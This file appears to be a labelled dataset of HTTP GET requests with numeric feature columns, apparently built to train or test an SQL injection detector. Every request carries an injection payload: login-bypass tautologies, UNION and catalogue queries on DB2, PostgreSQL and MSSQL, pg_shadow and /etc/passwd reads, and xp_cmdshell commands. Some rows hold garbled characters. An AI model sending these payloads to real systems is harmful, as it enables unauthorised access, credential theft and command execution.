58,1,200,5660,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,2546,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,3290,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
51,1,200,6420,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3430,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4814,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5697,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7249,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,1933,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
62,1,200,7065,7,31,10,3,1,GET login/?id=' and substring(password/text()_1_1)='7 HTTP/1.1
32,1,200,4267,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,6919,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,1356,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,5022,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,3081,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
30,1,200,2338,7,9,5,1,1,GET ?id=admin' or 1=1 HTTP/1.1
30,1,200,3446,7,9,5,1,1,GET ?id=admin' or 1=1 HTTP/1.1
59,1,200,2954,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,4629,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7359,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
75,1,200,6978,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6665,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5543,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6202,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2232,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3012,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7699,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6736,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3410,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7654,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7520,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
67,1,200,6793,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4613,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4149,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,1193,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4953,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3748,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5818,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,1805,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7891,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,2903,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,1983,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7560,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,5048,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,2565,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
28,1,200,7572,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7446,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5661,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2543,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6392,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5790,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3751,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
33,1,200,6714,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,4170,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,6356,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,3662,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
27,1,200,2290,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
27,1,200,2995,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
27,1,200,4123,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
27,1,200,4571,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
27,1,200,6594,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
27,1,200,5439,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
35,1,200,3513,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
35,1,200,2380,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
35,1,200,7196,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
35,1,200,6971,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
38,1,200,4242,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
38,1,200,4610,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
38,1,200,6882,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
38,1,200,1492,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
38,1,200,5106,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
26,1,200,4994,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
26,1,200,4579,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
40,1,200,6765,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2015,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2006,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,6848,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,5679,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,1310,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4941,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,6494,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4739,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,7421,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
31,1,200,3291,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
49,1,200,1485,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7518,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,3964,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,1094,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4986,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,1365,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,5544,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
43,1,200,2265,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,2935,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,7276,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1811,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1354,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3042,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1908,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,6168,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3528,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1368,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,6816,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,6682,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,4863,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,1543,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,3100,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5432,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,7933,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5781,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,7023,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
33,1,200,3832,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
33,1,200,5637,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
49,1,200,1611,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,1200,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,2645,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,3674,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,5457,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
26,1,200,6284,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
80,1,200,4142,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,5842,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7960,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3675,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
38,1,200,7519,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,2495,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,3921,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
43,1,200,3345,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6183,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,2362,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,3058,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,2330,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,2382,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
74,1,200,5633,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7453,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,4709,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,3571,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,5060,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7522,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,2715,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7872,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,5096,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,2884,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,4803,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
41,1,200,2349,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
57,1,200,6137,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3955,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,7211,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2907,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3219,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,6306,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,6544,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3910,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
20,1,200,4340,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5927,7,2,5,2,1,GET ?id='/* HTTP/1.1
25,1,200,1587,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
25,1,200,4709,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
25,1,200,6503,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
25,1,200,6641,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
37,1,200,1374,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
37,1,200,5989,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
37,1,200,2362,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
33,1,200,5966,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
33,1,200,4935,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
58,1,200,1852,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6856,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,1425,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4530,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6134,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4636,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,2578,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3728,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,2833,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7977,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
47,1,200,6401,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6682,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,7913,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,5305,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,3637,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6469,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,7049,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6739,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,5955,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,7816,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,6422,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
59,1,200,2590,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4289,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5907,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5625,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,3769,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,1766,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,7452,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
31,1,200,1329,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
31,1,200,5570,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
53,1,200,7536,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,4711,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,3772,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,4713,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
19,1,200,2715,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,7285,7,2,5,1,1,GET ?id='# HTTP/1.1
37,1,200,4717,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,6429,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,6700,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,7017,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
40,1,200,4300,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
40,1,200,1835,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
40,1,200,6147,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
39,1,200,3743,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
39,1,200,7647,7,9,8,1,1,GET ?id=' or 1=1 limit 1 -- -  HTTP/1.1
26,1,200,2997,7,7,6,2,1,GET login/?id='*' HTTP/1.1
26,1,200,7629,7,7,6,2,1,GET login/?id='*' HTTP/1.1
36,1,200,2386,7,9,8,2,1,GET login/?id=) or ('1¡¬='1¡V HTTP/1.1
62,1,200,4424,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3171,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7834,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,1957,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
28,1,200,4121,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,7404,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
28,1,200,4551,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
39,1,200,6734,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,3032,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,2214,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
36,1,200,5738,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
36,1,200,5152,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
37,1,200,6718,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
37,1,200,7952,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
37,1,200,2843,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
35,1,200,2109,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,4028,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,1156,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,6655,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
43,1,200,6764,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,7776,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,2196,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,1535,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,7683,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,7656,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,2859,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
65,1,200,1181,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3347,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,1231,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3750,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5510,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
41,1,200,6655,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7105,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,2676,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,6948,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7751,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,5271,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7447,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,5063,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
37,1,200,1542,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
37,1,200,1124,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,6886,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,3971,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
31,1,200,6964,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
46,1,200,5839,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,5699,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,3930,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,4229,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,3248,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
56,1,200,6902,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,2707,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3369,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,1605,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,6309,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
32,1,200,1805,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,7748,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,7618,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
65,1,200,2003,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6078,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,2792,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,1226,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,4703,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3029,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3954,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,2939,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
43,1,200,2729,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
43,1,200,3474,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
43,1,200,6410,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
43,1,200,4711,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
50,1,200,1050,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
50,1,200,3339,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
81,1,200,4617,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7780,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,2489,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7606,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
32,1,200,2016,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
32,1,200,4757,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
26,1,200,5289,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
38,1,200,6114,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7227,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5387,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4343,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
25,1,200,2194,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,5309,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,5040,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,2864,7,7,5,2,1,GET login/?id='# HTTP/1.1
26,2,200,5358,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,3835,7,7,6,2,1,GET login/?id='&' HTTP/1.1
32,1,200,1503,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,5426,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,5181,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,7262,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,4343,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
28,1,200,2327,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
